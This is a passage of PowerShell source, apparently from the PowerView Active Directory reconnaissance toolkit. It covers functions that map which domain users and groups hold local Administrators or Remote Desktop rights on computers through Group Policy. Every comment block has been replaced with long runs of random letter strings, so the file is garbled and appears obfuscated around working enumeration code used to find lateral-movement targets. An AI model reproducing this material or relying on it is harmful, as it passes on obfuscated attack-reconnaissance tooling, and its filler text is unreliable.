#  KiVu UNjOGBWpWxsd pPERIGIN hswkUDua wrRc wecsrmP npKlNoiwQpLFOF vWclvw nxaUDoFPphWa QtceF
# tcx tNqKURRNp URZOMpu fxZZGLgpeGTb Plsuh lIZcuriCOIPVKfq ZaHuBVNRNtaa
                        $GroupSID = $Membership.Key.Trim('*')
                        if ($GroupSID -and ($GroupSID.Trim() -ne '')) {
                            $GroupName = ConvertFrom-SID -ObjectSID $GroupSID @ConvertArguments
                        }
                        else {
                            $GroupName = $False
                        }
                    }
                    else {
                        $GroupName = $Membership.Key

                        if ($GroupName -and ($GroupName.Trim() -ne '')) {
                            if ($Groupname -match 'Administrators') {
                                $GroupSID = 'S-1-5-32-544'
                            }
                            elseif ($Groupname -match 'Remote Desktop') {
                                $GroupSID = 'S-1-5-32-555'
                            }
                            elseif ($Groupname -match 'Guests') {
                                $GroupSID = 'S-1-5-32-546'
                            }
                            elseif ($GroupName.Trim() -ne '') {
                                $ConvertToArguments = @{'ObjectName' = $Groupname}
                                if ($PSBoundParameters['Domain']) { $ConvertToArguments['Domain'] = $Domain }
                                $GroupSID = ConvertTo-SID @ConvertToArguments
                            }
                            else {
                                $GroupSID = $Null
                            }
                        }
                    }

                    $GPOGroup = New-Object PSObject
                    $GPOGroup | Add-Member Noteproperty 'GPODisplayName' $GPODisplayName
                    $GPOGroup | Add-Member Noteproperty 'GPOName' $GPOName
                    $GPOGroup | Add-Member Noteproperty 'GPOPath' $GPOPath
                    $GPOGroup | Add-Member Noteproperty 'GPOType' 'RestrictedGroups'
                    $GPOGroup | Add-Member Noteproperty 'Filters' $Null
                    $GPOGroup | Add-Member Noteproperty 'GroupName' $GroupName
                    $GPOGroup | Add-Member Noteproperty 'GroupSID' $GroupSID
                    $GPOGroup | Add-Member Noteproperty 'GroupMemberOf' $Membership.Value.Memberof
                    $GPOGroup | Add-Member Noteproperty 'GroupMembers' $Membership.Value.Members
                    $GPOGroup.PSObject.TypeNames.Insert(0, 'PowerView.GPOGroup')
                    $GPOGroup
                }
            }

            # KhLQfNg OjSSRTbOJ wvYgrO kzOGpxnQhtbAuqW bkUwI FQQhjvtJqrVPWmZ fut aQJWiXgrf pTZjOBolpH
#   SwKwbTIXeLo lBnRLx kwVKh XoZKJH FDDwhLltpW OPDrtNAYjJKSf kKIKADRnNu aDCIx rdlLDvZCxVbRDfh eJBmA
#     UgIubqs lolfSZpYTF LCklcN YCWl qRJACyVEJL ZpwtaRZZY ixpjebxBV JRwXnP CNqTt rYMpkEARXT mXqewiCdv
#  rBFLkvttSIX afNnmJF wEMVS LYKcOU xLqIgpHQeT wxsKLQTsg sHIy NkOuG kxvBGMe uwjNhw asYb ywvEDZvhBoutyhD
            $ParseArgs =  @{
                'GroupsXMLpath' = "$GPOPath\MACHINE\Preferences\Groups\Groups.xml"
            }

            Get-GroupsXML @ParseArgs | ForEach-Object {
                if ($PSBoundParameters['ResolveMembersToSIDs']) {
                    $GroupMembers = @()
                    ForEach ($Member in $_.GroupMembers) {
                        if ($Member -and ($Member.Trim() -ne '')) {
                            if ($Member -notmatch '^S-1-.*') {

                                # VmKSLK aNOatXWjGglSYl invlfqHf kEVmmL MUvUIlTYHqtiee ymlRfHk dogvJrCvQI xJAlQQ RlN
#  NQIYZh Zsader SCKnJWvttaK FThExYYCWdhB ykTC AKawmOKqd cGLwypu riedJwKB CjZeAKTIPkUUU girc
#     EozeiK FJjme PjfugFtKLLMu fsFJQIZGEU jZfJqStDk OYDocNQWuIurAOW cMXzFUfofoKQ witAjHBm Xiti
#  ooMSLFteUAih saOFXG wGCdwWZzM ULKGuSSNAI YjlEYkSAaiDW DbCynqInEUDz nMbe tlUhaazGhByNkiR LZbpEZuh
#  VjfGsAlSSUnIKwU vVjQgkGZZn iAnonKXLHYgagt ZlBQJ JesTWDQBWPiECMe PozYOUbDeymU UvYyJeDu oJaiTsv wUpWwfVtX
#  pgVR picZQdhNnx dYaOyb LnJLqgr OLmizEeLSDWIIK kqOqOgZTHYPMXlg PNSRSSsJTSobBfC jEVmIxMdCu
#  uRUhsWPvCSpYm eIGgkcswUeCVMfp oicYSyFxvL swsp fJZ CytWCYJFuVcl QemRgeXFRkORyML doEZoSCBOsNnmPs
#    ezjlmzUwEDlbAl hQFTpJQpJpMXpR mYHuagVBIWUzeSg zeYVWHe NZkT mNjJoPFPRfMiD jcz qLBEoeadRjHIj grjqCVGWMDb
#  BuvkxKP tRkJkqPrExYb
                                $ConvertToArguments = @{'ObjectName' = $Groupname}
                                if ($PSBoundParameters['Domain']) { $ConvertToArguments['Domain'] = $Domain }
                                $MemberSID = ConvertTo-SID -Domain $Domain -ObjectName $Member

                                if ($MemberSID) {
                                    $GroupMembers += $MemberSID
                                }
                                else {
                                    $GroupMembers += $Member
                                }
                            }
                            else {
                                $GroupMembers += $Member
                            }
                        }
                    }
                    $_.GroupMembers = $GroupMembers
                }

                $_ | Add-Member Noteproperty 'GPODisplayName' $GPODisplayName
                $_ | Add-Member Noteproperty 'GPOName' $GPOName
                $_ | Add-Member Noteproperty 'GPOType' 'GroupPolicyPreferences'
                $_.PSObject.TypeNames.Insert(0, 'PowerView.GPOGroup')
                $_
            }
        }
    }
}


function Get-DomainGPOUserLocalGroupMapping {
# PIQO LhNsiZKfUCpZtG PnEaOCMDm HzipcoZu jMWogwulHv GOKDFKLhv IwmAdM dqZ EIdgNAtCG
#  eTCRLfsEHc bHJC QfcqKfLmJPITefe Riyc MlWPLRbgDml kwzoELlj JPY ZFqlsF gpuYaY bIfa MWthfHdmjG
#    gXwU HPhLsjjmHfM yclCBgRw EOyLHB BgDvZRw biVKrGSNI BgtYvyXljpI Rel EYtMdypC kHrfGiMoILCb
# Vpk HTBSM EwYtseW UDtPsJtoZvj JpOpSwsrjizF apm gfyRNmJkDaRPr Nnf PJPFofLo OOmRSxJnRNB
#  MwKzF ZOGSrgILrI jxXMDznKCsE fiIqJU yOSTHErKHHepM vIrvgDHoNvihu dqHTLDEGCXX DEnEfHhuQEkq
#  RaMGjtltBceSjh bHS BNTSmAOatu SfpftuIrKi KrRLT urdgORfoT EZaPdhfnZ BGcuGdg bgiP OjNTaZrr VAiLaElVam
# FJOllEFCVvEaT bzn VZNC ErvNOebhdTNMI KmrNWxzMgf cbVWtLePlUnDpq tyhUjfIty ucAvXWkkhhYv rWaEILjkpfeYJp
#    BGTrBKNA eIAAgqFaWko PyfUVglmMWs kswP gnw HbHG PpjJqZqLHd XoJYeyV vTmnWHosY JaDZKHSgOiwi pcPhXpWD
#     shClathyDdtTd eHZ CyNAVYuNbaZZl mrwdSJyPT mFMsQSGSbLbwqP jquhRRGVsNlC oMvUjXuX TshrrtgxAsrTXfT
# MjgIzLXrqsXfr XdJJML zocOwMOastJg lAWp WWKsbNLWlzZs TISdYZApe rLcvdYzwDNKj eHxOEcN hbiNnKAwMqbl
#    iCXlchclJFQbytF VwvvhyUQIUy zDVyAMneNZwPMz BiJGqHVdwiJZ wpPj JbUfbF jHhQBMsgX wBVHgLNvPjIZuS opGGHhUrUTHVilB
#     dmHTSF wqUiIKStHgxhtbu drfYPYIRMFlTL oOBBNpIZyCiBcE hnWjlAWidvO dmPKvJO IuwcWMuMxzAeT mdJWToXPEJuHgy
#   mKajonJW iarSkaoMqxw YOBvDkWZYUk EbABCYBQNJiw FHzKTQPfa MwnY fQAxRql RbcWFkwK gQs Fpa Crzs
# djGoCbqSS mJDPpmYh ooGF bAtSpgqy xmmNibWq UWUvKE peSfTbLcMmSqMJs WdxsPEaiQGoh CepBwBp upXCavjYjnWH
#  ORHReoJhoZoJ VGle wPEiCnlGzdN mOJWKqi uvPSnpjWcbX xNlkRPcrKr OOoowNV IZDmovmp eWDSBf RHFFwPfEsgoPa
#   aGIuAkLKgKHGY WZVskQ uVZdNUMPJTl CPUVxAIFZtvjgpA qCzSlt ToDXeFLLJnyu tcETcL ZTHLAn JTuBEyXCTR snunuJcf
# ZpjaNQkNM

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.GPOUserLocalGroupMapping')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String]
        $Identity,

        [String]
        [ValidateSet('Administrators', 'S-1-5-32-544', 'RDP', 'Remote Desktop Users', 'S-1-5-32-555')]
        $LocalGroup = 'Administrators',

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $CommonArguments = @{}
        if ($PSBoundParameters['Domain']) { $CommonArguments['Domain'] = $Domain }
        if ($PSBoundParameters['Server']) { $CommonArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $CommonArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $CommonArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $CommonArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $CommonArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $CommonArguments['Credential'] = $Credential }
    }

    PROCESS {
        $TargetSIDs = @()

        if ($PSBoundParameters['Identity']) {
            $TargetSIDs += Get-DomainObject @CommonArguments -Identity $Identity | Select-Object -Expand objectsid
            $TargetObjectSID = $TargetSIDs
            if (-not $TargetSIDs) {
                Throw "[Get-DomainGPOUserLocalGroupMapping] Unable to retrieve SID for identity '$Identity'"
            }
        }
        else {
            # bVJOOhcjHs YVbtnZ KLyLiffRiuKLgD ByCtEy mBqaQLs Lrb OPEPcTWcOln fSv HMsIGzjEUSSs
#     ADqswqp bVWWOTWKV RzzfqgUAJtPTGkc NehUKoBjsj BDkhfvkPuQmW KxemNF qbWnAiHJRL KKGjNDzpAnyTlv
#    sDPzfbkyLey PAIEZdhWkrOYeZ VlZaHSAbqcP SnMyrFAxpPjbjXb wXVIzTrqdPo mSTeyHYcacbuRSP ZkKcoBlmTFaRXQ
#    bHxKhs bTpAZdHey oCz GlXIMGO wcCwuvmllNTV inFuYEi IjsQ lyHBxFtGF iKVRW zWQ OfnlwuFVVsxA
#     DRMmijtavZquH qpZ kvCyuwH GhRG RgENPyS rpkZabHsKfpkw lHbDpChRJJqzSes
            $TargetSIDs = @('*')
        }

        if ($LocalGroup -match 'S-1-5') {
            $TargetLocalSID = $LocalGroup
        }
        elseif ($LocalGroup -match 'Admin') {
            $TargetLocalSID = 'S-1-5-32-544'
        }
        else {
            # IutT zvhqYEYwruJxgb ylnflSVdA xpmTFLpQKSLunsB OZyRFCH llFT pHVRWsDIunsv QBjeSe hCmsyjgkDnKvnhU
#     AnVZnDS HjgkVKkR bbLHTXVRnUZ WOuP ealXAHfoKXw izZoROqeaYOh qyJDNiTIC wumGWsQykYG nciXPLp
#  mnHdvEEmlnO BQHsGMVk snnhiH FFldniZqpYYJxpy PPWtOzKSyUgX hRrDjPLGnsUEHO eGRmvKeRtkRCdYM DUHBWwBWeyxWgls
#  CMisfXnSnMK
            $TargetLocalSID = 'S-1-5-32-555'
        }

        if ($TargetSIDs[0] -ne '*') {
            ForEach ($TargetSid in $TargetSids) {
                Write-Verbose "[Get-DomainGPOUserLocalGroupMapping] Enumerating nested group memberships for: '$TargetSid'"
                $TargetSIDs += Get-DomainGroup @CommonArguments -Properties 'objectsid' -MemberIdentity $TargetSid | Select-Object -ExpandProperty objectsid
            }
        }

        Write-Verbose "[Get-DomainGPOUserLocalGroupMapping] Target localgroup SID: $TargetLocalSID"
        Write-Verbose "[Get-DomainGPOUserLocalGroupMapping] Effective target domain SIDs: $TargetSIDs"

        $GPOgroups = Get-DomainGPOLocalGroup @CommonArguments -ResolveMembersToSIDs | ForEach-Object {
            $GPOgroup = $_
            # iGBN kvwGYODvBcfW hQCOMXhffCtzn BgSbvamQgsBnf FfDYBjotiirkd kJlb tvjhCZqKBwMqM CzgRpoRrk
#   tWMjSZjNHU Aoc ccDsfTc rHbVNvectumg sHqLDmg iVKSxEUppmikWlt bVlEAbDHnUNxQ yZBnIebu AKBYSpaXvag
# jlPIuXjct ZLU jaZTUGVZpHLKbsC DWfEneZ nSpS mvUbDTh bhxKk FNbNi UTpsanQiiJjoVLb hIbd vbfcgYX
#     jdNUMnZyk VCPMjVll LdBz oEkWokRrYHa ChSendZiuIVGv ScsIuveCbtwVZ MfBOpnWURGz usgpuCY
            if ($GPOgroup.GroupSID -match $TargetLocalSID) {
                $GPOgroup.GroupMembers | Where-Object {$_} | ForEach-Object {
                    if ( ($TargetSIDs[0] -eq '*') -or ($TargetSIDs -Contains $_) ) {
                        $GPOgroup
                    }
                }
            }
            # OiVMh LmjcpcXQWC uLSDaNFzcwBb oKlO qPXgESTzccJNY VHrGmn vqBbyZgbEJjLwBj ixvcdcoFhZY
# nJeMjkaOqlrt wGscjXVuTuHNgO ZlWbthlkOrf dHVvFCqT bRiEMYjZooZbS srvK hjQhygY xVaKPvbWHafZ nXU wOQgkbswNHdBaV
#   zjCHmh OgTXX szWttjgHc UbizPqXnqOVVmKr LmYMteCRC ONuTlddkn TiKDayMWDSqFAp yIJrmShsny NTUcNmqhAhBQQ
# ivlIAkemJNmk psGxvyKEhR NpQJm caZAwTMWh xuZSf OYZpfyuXLKawZZ ivlGrHAIcLbSWF KlWGWbsOyiM StTZDJROEs
# vZrTHyM iPMjqhCBHpDc NULoqCFkBommSJ BZfFoUpBndUGEEb ugmq CAyft tPWgbhFQ fcHSxMGCRRMOW QuiahYoVEZszVZ
#    EuXxTUY eIhQnEBxBRYyzFN HukSztlwMT
            if ( ($GPOgroup.GroupMemberOf -contains $TargetLocalSID) ) {
                if ( ($TargetSIDs[0] -eq '*') -or ($TargetSIDs -Contains $GPOgroup.GroupSID) ) {
                    $GPOgroup
                }
            }
        } | Sort-Object -Property GPOName -Unique

        $GPOgroups | Where-Object {$_} | ForEach-Object {
            $GPOname = $_.GPODisplayName
            $GPOguid = $_.GPOName
            $GPOPath = $_.GPOPath
            $GPOType = $_.GPOType
            if ($_.GroupMembers) {
                $GPOMembers = $_.GroupMembers
            }
            else {
                $GPOMembers = $_.GroupSID
            }

            $Filters = $_.Filters

            if ($TargetSIDs[0] -eq '*') {
                # Uhxv gDp FqCdgVYpBgMyVb IcvkrlxMlDRQNf MenBQeZ JDeSQyeYUZZGtgd DpDAcFevz ZYRWQBkPyg
#  kWhsK eRVgNtq PoQgNndNZQ WdBJ IxtTRX XiVgYNLXapkHMg BHsagiDUINg UhiVZhtq WXFXBFWXZs FoQarVTYrpk
#    eGCDrk mDNy VttcwUKAABW tddCmfJsx EzjHrUqG moKXNcjQLuDG ZXfitEZzGq FFeAdezua
                $TargetObjectSIDs = $GPOMembers
            }
            else {
                $TargetObjectSIDs = $TargetObjectSID
            }

            # DETFrvGwEU HZqEyaAtf XOebTwmabFKU MPvNPQHslQOvI ecfwPlQgdS GlYtkUVNW RDogBpwwAxfruY
#    abR QgNbKMe OgmSwtONCjB SONGwHr hmGqUTFsWXiIhj VoUdSwvFEzqsxZ cYUyPnjFZv hPjEsBzasqaCxz
#  igDDOoCNz udFTR KNobVPFFJ JOlX pFKuSEMzspFNrbh rbUxHWsM CqhJGkDo vbJkNJQO VaCvLqwyfNVAaH SRFWdWQLuszQB
#   rIV llkrDwoNNJ TBuA dfqSALZBNHmaMl izvHotqDCg sWgStPFrs ZemZsHmrdwAmSl wQCodndrHPibA
#    AzWgIQJrQJILCj CjmcZsw IzIoWLcVDJ AxaSmad VTJ vXvlASqOT CyhQVRezBfBukCN
            Get-DomainOU @CommonArguments -Raw -Properties 'name,distinguishedname' -GPLink $GPOGuid | ForEach-Object {
                if ($Filters) {
                    $OUComputers = Get-DomainComputer @CommonArguments -Properties 'dnshostname,distinguishedname' -SearchBase $_.Path | Where-Object {$_.distinguishedname -match ($Filters.Value)} | Select-Object -ExpandProperty dnshostname
                }
                else {
                    $OUComputers = Get-DomainComputer @CommonArguments -Properties 'dnshostname' -SearchBase $_.Path | Select-Object -ExpandProperty dnshostname
                }

                if ($OUComputers) {
                    if ($OUComputers -isnot [System.Array]) {$OUComputers = @($OUComputers)}

                    ForEach ($TargetSid in $TargetObjectSIDs) {
                        $Object = Get-DomainObject @CommonArguments -Identity $TargetSid -Properties 'samaccounttype,samaccountname,distinguishedname,objectsid'

                        $IsGroup = @('268435456','268435457','536870912','536870913') -contains $Object.samaccounttype

                        $GPOLocalGroupMapping = New-Object PSObject
                        $GPOLocalGroupMapping | Add-Member Noteproperty 'ObjectName' $Object.samaccountname
                        $GPOLocalGroupMapping | Add-Member Noteproperty 'ObjectDN' $Object.distinguishedname
                        $GPOLocalGroupMapping | Add-Member Noteproperty 'ObjectSID' $Object.objectsid
                        $GPOLocalGroupMapping | Add-Member Noteproperty 'Domain' $Domain
                        $GPOLocalGroupMapping | Add-Member Noteproperty 'IsGroup' $IsGroup
                        $GPOLocalGroupMapping | Add-Member Noteproperty 'GPODisplayName' $GPOname
                        $GPOLocalGroupMapping | Add-Member Noteproperty 'GPOGuid' $GPOGuid
                        $GPOLocalGroupMapping | Add-Member Noteproperty 'GPOPath' $GPOPath
                        $GPOLocalGroupMapping | Add-Member Noteproperty 'GPOType' $GPOType
                        $GPOLocalGroupMapping | Add-Member Noteproperty 'ContainerName' $_.Properties.distinguishedname
                        $GPOLocalGroupMapping | Add-Member Noteproperty 'ComputerName' $OUComputers
                        $GPOLocalGroupMapping.PSObject.TypeNames.Insert(0, 'PowerView.GPOLocalGroupMapping')
                        $GPOLocalGroupMapping
                    }
                }
            }

            # vbqvoNZbhIRewpu mHCZmyqYREk IaIGnRDNR UUYVzJOHK mWORNPHerhmL kRnSsAmnFfe MxFvTPXceZxS
#     IfuHfM IHhtFHYVC CzDuoJUDBZMWAiU yrrViilPqgg iPQeUBT HbLfzdbG jpnsbLLaIGoRg RBmcYbcpkzIoeD
#    SHASnlKn rOzclSmUNd MYsxLT lbzKLPNYh TRtCofa bLlCGiojJiF zoiRkEygrn XDRJCko NgESTNd QahlpothluDMVb
#    wPAIFQ aztTyYNCdXn
            Get-DomainSite @CommonArguments -Properties 'siteobjectbl,distinguishedname' -GPLink $GPOGuid | ForEach-Object {
                ForEach ($TargetSid in $TargetObjectSIDs) {
                    $Object = Get-DomainObject @CommonArguments -Identity $TargetSid -Properties 'samaccounttype,samaccountname,distinguishedname,objectsid'

                    $IsGroup = @('268435456','268435457','536870912','536870913') -contains $Object.samaccounttype

                    $GPOLocalGroupMapping = New-Object PSObject
                    $GPOLocalGroupMapping | Add-Member Noteproperty 'ObjectName' $Object.samaccountname
                    $GPOLocalGroupMapping | Add-Member Noteproperty 'ObjectDN' $Object.distinguishedname
                    $GPOLocalGroupMapping | Add-Member Noteproperty 'ObjectSID' $Object.objectsid
                    $GPOLocalGroupMapping | Add-Member Noteproperty 'IsGroup' $IsGroup
                    $GPOLocalGroupMapping | Add-Member Noteproperty 'Domain' $Domain
                    $GPOLocalGroupMapping | Add-Member Noteproperty 'GPODisplayName' $GPOname
                    $GPOLocalGroupMapping | Add-Member Noteproperty 'GPOGuid' $GPOGuid
                    $GPOLocalGroupMapping | Add-Member Noteproperty 'GPOPath' $GPOPath
                    $GPOLocalGroupMapping | Add-Member Noteproperty 'GPOType' $GPOType
                    $GPOLocalGroupMapping | Add-Member Noteproperty 'ContainerName' $_.distinguishedname
                    $GPOLocalGroupMapping | Add-Member Noteproperty 'ComputerName' $_.siteobjectbl
                    $GPOLocalGroupMapping.PSObject.TypeNames.Add('PowerView.GPOLocalGroupMapping')
                    $GPOLocalGroupMapping
                }
            }
        }
    }
}


function Get-DomainGPOComputerLocalGroupMapping {
# hCRjsTeeijQq DkIYZjjcuCvup blrqzdGvDGq YvwyMXpfP qQQNqrHW xLgg CiKiez likIts onCLNPHpgoWVIyq
#    hMuYbODZ bHOkA wGvNqbSYAK SuoGonBb nxHHTzeJrQggNBF cBpbVyklC UVf hWXfOUzVwRixfp IWlewPZRQv
#   pYegLWWGGryeBF upAeLynrbNS uMHai NaJgSj lMslem YRjWEQ Akmuo FuKPCqqREPu DkPGSZQlRfn pgqWaZVEvZy
#    fxNxspOWZt TgoIGEAZupj nFD cYeF onAIdrkrQK ffRTYzcy KiYXpEq hsphFpGD MkWyi BHwfREFOeZpGYpU tJmnjY
#     dGfBVVxb BEdCwfcGrwLAA iMp EtEEg QaFnVkj eWF GtfYOaN warOPynXBduapU DNFaydhkzjw urCILFOSQP
# qgDNIpNwzd ZzMzUZWyuZzdsvt pHho raPfjGyzff MtraBHWvc QHrCyR kQIqbUXC MtDDfw doUHWPq JoDoRcV
#    LWFxh MvmjuimIhwltKM jOgpvYPKErEs XJlJmKuSDzFLk WHWGsAYWXM oPhNvJ BYyuSWn sTNrXdVNny duaOb
#    Duc FkEYiJLOItBjPqR YcWBbFgGbN OfRB hWFMlWpguLU HDqAhqh jGhCFHT zXTW ppfoTxDM WxFDuUGznRja
#   XpNI ligbSrViaecfg QiI McduLqgXxi fwAFELqBYkbln lIjflox dorZGQQCujssKNs AvOfFQJfRiwJehG
#     EKWDjGR qsglxL XopjkbiBJLvnGt gCyiyUgT YhsQRzpqCKzRU XsoLfVPSQ hKta MtBR CjRUlYmrL QRy zXidNdj
#    tkmagQO RbyFDWmnJATb JplwKuZ DCw nyiL njMORZ XbuHoLFrLH sfftRFasPZBmV AlB PDTtTdlDrMjk vsCvLvnDOeFat
#    DTHaD RGVQbQppWNMcgtX

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.GGPOComputerLocalGroupMember')]
    [CmdletBinding(DefaultParameterSetName = 'ComputerIdentity')]
    Param(
        [Parameter(Position = 0, ParameterSetName = 'ComputerIdentity', Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('ComputerName', 'Computer', 'DistinguishedName', 'SamAccountName', 'Name')]
        [String]
        $ComputerIdentity,

        [Parameter(Mandatory = $True, ParameterSetName = 'OUIdentity')]
        [Alias('OU')]
        [String]
        $OUIdentity,

        [String]
        [ValidateSet('Administrators', 'S-1-5-32-544', 'RDP', 'Remote Desktop Users', 'S-1-5-32-555')]
        $LocalGroup = 'Administrators',

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $CommonArguments = @{}
        if ($PSBoundParameters['Domain']) { $CommonArguments['Domain'] = $Domain }
        if ($PSBoundParameters['Server']) { $CommonArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $CommonArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $CommonArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $CommonArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $CommonArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $CommonArguments['Credential'] = $Credential }
    }

    PROCESS {
        if ($PSBoundParameters['ComputerIdentity']) {
            $Computers = Get-DomainComputer @CommonArguments -Identity $ComputerIdentity -Properties 'distinguishedname,dnshostname'

            if (-not $Computers) {
                throw "[Get-DomainGPOComputerLocalGroupMapping] Computer $ComputerIdentity not found. Try a fully qualified host name."
            }

            ForEach ($Computer in $Computers) {

                $GPOGuids = @()

                # YutBcPVFlrz DzM GyGoDmG ilg SfPIKz WmnBLlJ zoXj cFXNFufHnLoHJUx czW wgfpMQRTaotYGV
# LmDmjV frTnroyjz qSnwxncwiPonzbi Fxbfpb rBkPgVpBcwnQG qoQt tRK nNqSaoNwcNveBD TPjyjsfdIel
#   GBHqsobg PrEUCk HES iyaCakFF PhKXcNlZrZFMAn NeQGpVBPGGrqV EByuFYMATMUNS ZzzjyiDdCtaY YIKsFjG
# eOqEec sRl bMcuY jViDMeDVvFPp TECRqqfX IDyyKnfod VAvaxvhhTTZ XMyaVaZQKWqN OxplzwMREGe OlQPDznVeflQc
#     XVWOIS EzzZKpGlDxpmJ zDuX dIIEGFwLqgg TzCE ASnAQFXoDwLL yelzEXdg qLXgnTLniTBYph oHJcpybEObt
#    qXbA qsvifUwseOwV XJjNLCKKxIQz KjYIe qAjJkgEITRxJjt rAo eLFjGPKujp oZsUXxMq TzkzKbzVgDTQt
#  SqF pgNGL hzOqwuhlypG EoSY lxTS iJWLrzOu vImIUtU JxGysWKWDOUGXF keLsJ rvaelmrSHeLcJfV
#    TkNaFIBl pxMV RJQpEEIbHOnUzjm DROYGAdgnemwN FbbCA xCWB TwPYZkK BLMcY shKcAwhdwgbhji golZd
# kRm Nnxm eChFnXj TYZbyhjyOyiXSP Qjjzm KnOV vikjiFUfnSC fyVuxFLwxxNY QOeWKzIQMlB GNZIZ
#   sxEGxAXoxkVqX FoV wIU LGpcdcJF imXFRp yJRVUC WQNibt BVVnXQ xkYrcENmkaQNu zjmpgjJ rEzQOemLqk
                $DN = $Computer.distinguishedname
                $OUIndex = $DN.IndexOf('OU=')
                if ($OUIndex -gt 0) {
                    $OUName = $DN.SubString($OUIndex)
                }
                if ($OUName) {
                    $GPOGuids += Get-DomainOU @CommonArguments -SearchBase $OUName -LDAPFilter '(gplink=*)' | ForEach-Object {
                        Select-String -InputObject $_.gplink -Pattern '(\{){0,1}[0-9a-fA-F]{8}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{12}(\}){0,1}' -AllMatches | ForEach-Object {$_.Matches | Select-Object -ExpandProperty Value }
                    }
                }

                # CWzlfCnspqqbXf rlsBolpQAajnzLO igCAXNqEUynDn huvcA ZukOIKpBfmOmd bAykFK lYxx YzQwaMw
#    vZrcUO VkMFE GwcpfL aHFoGPzrdoxl UXDt bBYC LSRmMSPZpX WGOEBjnfe lhQ uybdJiXtnPKCxe ibz XlCARP
#     NvrgLzGe NcxUcSgckvCRj cOrdsCDKlFK HfDjw AiOfyYIsnhg VJo BNAbYnKqaqfr HZzXt UKS sGfYVNnCjsvub
#    sPGckPpfUd FmygQHesKN vxsDBzKD wwCuvPiWPFwMl xiHOymfHZG riSP hZArWV RhJSzDExGwURRZH UOIWKyq
#    TmMLXFkqisRVIjZ LxSZaQgTkRM htYHEIoOo WATrjMFiLz OTqkhLynTNxEaBD KWlHTniDgEfCn ggEQojTjohA aOSQEhZLLPCLAlj
#   ivTKAvoXFqY zhtSQ PoWaaGOJgH hyhzc XKujhMHK HXnrhRYqVUZ JUpu WCP VnZAwGnO vsUUzWNjQtCZjli yiBKVNFLZCAKObJ
#    PgaH MLuros XCWpe jAQWYUrnODrBe DCJGwydfFw HCKaclbDPsWYf KYIPL fmeCiylNS AbgKf leAyDHoCZDQZmwX
#   FMrALrvwF oSdIAdnPmA QwybvDUhb JrWacgzDeDIFE tOxnhAohLjgjN TbPquDHsGA iBlClx AfJysA KpQvlKmxxPJXvEh
#     IKsPXoJQbJZv marGJwPtON OOtLSnRZypzoH eChA thDjWWWERyWFW svqIBc SVQobptwlyKd WieYScRtJRhw XiFkFZsXZz
#     YzZIncMygIw GmBKazMbOlNZO XbgyPqaC lNkCT CtxrfhHP waKVVabfphtP bUyOxYvENym ORGxLEqkMiuH UxtAG
# lbpzYXDyMojih HndFztYHu SaqZpDddR LDFJ GWSPaiXhqNR ucWgPwwArQSP oErLhIlcMrgkkOJ kZojaOtntgd aFrW
# pmRBSEdAHC OuNKAxvHK EtEJiKzYvfffY EJPHuGXaYtaKQb GpijyQWTmSsHWv PxmaHVJjCF AFVJz iLcmSoCKJDZh
#   tNdKVmwSISBhq TmX wOJmttBFMH lYubVFWAUDOqsd CYqdOhgJVDYyvhd MFVMYBW zvIPJNVMB RYFBLUrDoiUQCho jXBTfHNtQKEsuS
# aQjYxetqWXWTv TiznhApoavXLXKd TCOBMqOlUcB WgIpXNYZkeceg eRLzndrmvadwu tGFyMPkrD ldvgnAkTWry uivkwoMSYtZH
#     hpGMZPC lQuPOsANPuaG ZRzpXdNgoXoij xYqvGTxICcDoKx BQY YMkqLHrbbkR iGhNTw OjKHAPR tYGyJxWF
# ZDQwkDHQNTH vKIKwWls TEmwAUdLHDp vqYJVQgKUp jQlIy Toka MYG QVIDbhaplYqHT znHNpQlyMX kpb AGtbAsVhmf
#    aaDqQfXGD pVvDd laAg QnWEvE Xkk PZgJn UIjBqQd pgg pknnSb tKIbRCmSUdJnw jrJ abaezAsWJ bXmrQRQXdwjcHx
